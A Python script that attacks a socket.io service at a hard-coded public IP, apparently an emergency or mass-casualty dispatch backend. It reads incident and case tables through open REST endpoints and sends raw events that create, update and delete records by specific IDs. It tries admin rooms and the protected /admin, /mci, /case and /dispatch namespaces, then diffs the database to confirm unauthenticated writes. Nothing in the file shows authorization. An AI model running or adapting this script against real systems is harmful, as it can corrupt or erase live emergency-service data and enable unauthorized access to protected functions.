#!/usr/bin/env python3
"""
3800 socket.io write verification — bypass drain timeout.
Key fix: skip drain GET (it blocks for 20s); POST business events directly.
"""
import requests, urllib3, json, re, time, sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BASE = "http://35.234.50.28:3800"


def sio_open(s):
    """Open a session: GET handshake, return sid. Skip drain."""
    r = s.get(f"{BASE}/socket.io/?EIO=4&transport=polling", timeout=10)
    m = re.search(r'"sid":"([^"]+)"', r.text)
    return m.group(1) if m else None


def sio_send(s, sid, ns, event, args):
    """POST a business event on socket.io v3.

    Protocol:
      - 40<ns>, is namespace join (omit if ns is empty / default)
      - 42<ns><json-array-event-name-and-args> is message on namespace
    """
    # Prepare the body that contains namespace join + message
    encoded_chunks = []
    if ns:
        join = f"40{ns},"
        encoded_chunks.append(f"{len(join)}:{join}")

    payload = json.dumps([event] + (args if isinstance(args, list) else [args]),
                         ensure_ascii=False, separators=(',', ':'))
    msg = f"42{ns}{payload}"
    encoded_chunks.append(f"{len(msg)}:{msg}")
    body = "".join(encoded_chunks)

    r = s.post(
        f"{BASE}/socket.io/?EIO=4&transport=polling&sid={sid}",
        data=body,
        headers={"Content-Type": "text/plain;charset=UTF-8"},
        timeout=10,
    )
    return r.status_code, r.text


def snapshot_mcicase():
    r = requests.get(f"{BASE}/MciCaseRecords?_limit=100&_order=desc&_sort=id", verify=False, timeout=10)
    return r.json()


def snapshot_mcitypes():
    r = requests.get(f"{BASE}/MciTypes", verify=False, timeout=10)
    return r.json()


def main():
    s = requests.Session()

    print("===== Step 0: Snapshot DB before =====")
    before_cases = snapshot_mcicase()
    before_types = snapshot_mcitypes()
    print(f"  MciCaseRecords before: count={len(before_cases)}, max_id={max(c['id'] for c in before_cases)}")
    print(f"  MciTypes before: count={len(before_types)}, max_id={max(t['id'] for t in before_types)}")

    print("\n===== Step 1: Open socket.io session =====")
    sid = sio_open(s)
    print(f"  sid={sid}")
    if not sid:
        print("  [FATAL] no sid, abort")
        return

    # ===== Step 2: Emit business events =====
    print("\n===== Step 2: Emit business events (default ns '') =====")
    events = [
        ("new-mci", {"name": "PROBE_3800", "address": "探測", "numberOfAmbulance": 0, "isSimulation": True, "MciTypeId": 1, "StatusId": 2}),
        ("update-mci", {"id": "17b3ced2-4fe3-4e3f-803b-824d1341deb2", "name": "PROBE_UPDATE_3800"}),
        ("delete-mci", {"id": "10c720d8-0693-4158-b178-297dbcfa4052"}),
        ("new-case", {"name": "PROBE_CASE", "address": "測試", "isSimulation": True}),
        ("update-case", {"id": "23c1e227-b5ac-4695-9638-a0681d8e0a9b", "name": "PROBE_UPDATE_CASE"}),
        ("delete-case", {"id": "23c1e227-b5ac-4695-9638-a0681d8e0a9b"}),
        ("new-ambulance-record", {"caseId": "23c1e227-b5ac-4695-9638-a0681d8e0a9b", "ambulanceId": "PROBE_AMB"}),
        ("ping", {}),
        ("client.subscribe", {"roomName": "mci"}),
        ("client.unsubscribe", {"roomName": "mci"}),
        ("subscribe", {"room": "case"}),
        ("join", {"room": "admin"}),
        ("hello", {"user": "test"}),
        ("ready", {}),
    ]
    for ev, payload in events:
        try:
            status, text = sio_send(s, sid, "", ev, payload)
            ok = (status == 200 and len(text) < 10)
            print(f"  emit({ev}): status={status} resp='{text[:50]}'  ok={ok}")
        except Exception as e:
            print(f"  emit({ev}): ERR {e}")
        time.sleep(0.3)

    # ===== Step 3: Snapshot DB after =====
    print("\n===== Step 3: Snapshot DB after (sleep 3s for processing) =====")
    time.sleep(3)
    after_cases = snapshot_mcicase()
    after_types = snapshot_mcitypes()
    print(f"  MciCaseRecords after: count={len(after_cases)}, max_id={max(c['id'] for c in after_cases)}")
    print(f"  MciTypes after: count={len(after_types)}, max_id={max(t['id'] for t in after_types)}")

    before_ids = {c["id"] for c in before_cases}
    new_ids = [c for c in after_cases if c["id"] not in before_ids]
    print(f"  New records: {len(new_ids)}")
    for c in new_ids[:5]:
        print(f"    id={c['id'][:14]}... name={c['name']} createdAt={c['createdAt']} updatedAt={c['updatedAt']}")

    before_map = {c["id"]: c["updatedAt"] for c in before_cases}
    updated = [c for c in after_cases if c["id"] in before_map and c["updatedAt"] != before_map[c["id"]]]
    print(f"  Updated records: {len(updated)}")
    for c in updated[:5]:
        print(f"    id={c['id'][:14]}... old={before_map[c['id']]} new={c['updatedAt']} name={c['name']}")

    # MciTypes diff
    type_before_ids = {t["id"] for t in before_types}
    new_types = [t for t in after_types if t["id"] not in type_before_ids]
    print(f"  New types: {len(new_types)}")
    for t in new_types[:5]:
        print(f"    id={t['id']} name={t['name'][:40]}")

    # ===== Step 4: Try events on protected namespaces =====
    print("\n===== Step 4: Try events on /admin /mci /case namespaces =====")
    for ns in ["/admin", "/mci", "/case", "/dispatch"]:
        sid_ns = sio_open(s)
        if not sid_ns:
            continue
        for ev in ["hello", "ready", "auth", "ping", "subscribe"]:
            try:
                status, text = sio_send(s, sid_ns, ns, ev, {"probe": True})
                print(f"  ns={ns} ev={ev}: status={status} resp='{text[:40]}'")
            except Exception as e:
                print(f"  ns={ns} ev={ev}: ERR {e}")
            time.sleep(0.1)


if __name__ == "__main__":
    main()